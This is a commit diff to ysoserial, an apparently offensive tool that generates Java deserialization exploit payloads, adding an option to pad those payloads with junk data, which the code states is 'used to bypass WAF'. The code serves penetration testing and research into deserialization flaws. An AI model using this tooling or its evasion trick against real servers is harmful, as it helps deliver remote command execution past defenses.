bf8605cc8e9fe4a32e894d6404608e2f287128c3
0berry <chenyh.gx@gmail.com>
2022-06-30 05:50:21 +0800

    add DirtyDataWrapper

--- src/main/java/ysoserial/GeneratePayload.java
+++ src/main/java/ysoserial/GeneratePayload.java
@@ -7,21 +7,35 @@ import ysoserial.payloads.ObjectPayload;
 import ysoserial.payloads.ObjectPayload.Utils;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import org.apache.commons.cli.*;
+import ysoserial.payloads.util.DirtyDataWrapper;
 
 @SuppressWarnings("rawtypes")
 public class GeneratePayload {
 	private static final int INTERNAL_ERROR_CODE = 70;
 	private static final int USAGE_CODE = 64;
+    public static CommandLine cmdLine;
 
-	public static void main(final String[] args) {
-		if (args.length != 2) {
-			printUsage();
-			System.exit(USAGE_CODE);
-		}
+    public static void main(final String[] args) {
+//		if (args.length != 2) {
+//			printUsage();
+//			System.exit(USAGE_CODE);
+//		}
 		final String payloadType = args[0];
 		final String command = args[1];
 
-		// 拿到要序列化的gadget类
+		// 增加cli 参数解析
+        Options options = new Options();
+        options.addOption("ddl", "dirt-data-length",true,"Add the length of dirty data, used to bypass WAF");
+        CommandLineParser parser = new DefaultParser();
+        try {
+            cmdLine = parser.parse(options, args);
+        }catch (Exception e){
+            System.out.println("[*] Parameter input error, please use -h for more information");
+        }
+
+
+        // 拿到要序列化的gadget类
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
 			System.err.println("Invalid payload type '" + payloadType + "'");
@@ -30,11 +44,20 @@ public class GeneratePayload {
 			return; // make null analysis happy
 		}
 
+
+
 		try {
 		    // 对gadget类进行实例化，生成payload
-			final ObjectPayload payload = payloadClass.newInstance();
+			 ObjectPayload payload = payloadClass.newInstance();
 			// 每个gadget的payload构造不同就看这个getObject了
-			final Object object = payload.getObject(command);
+			 Object object = payload.getObject(command);
+
+            if(cmdLine.hasOption("dirt-data-length")){
+                int dirtDataLength = Integer.valueOf(cmdLine.getOptionValue("dirt-data-length"));
+                DirtyDataWrapper dirtyDataWrapper = new DirtyDataWrapper(object,dirtDataLength);
+                object = dirtyDataWrapper.doWrap();
+            }
+
 			PrintStream out = System.out;
 			// 对实例化的对象进行序列化
 			Serializer.serialize(object, out);
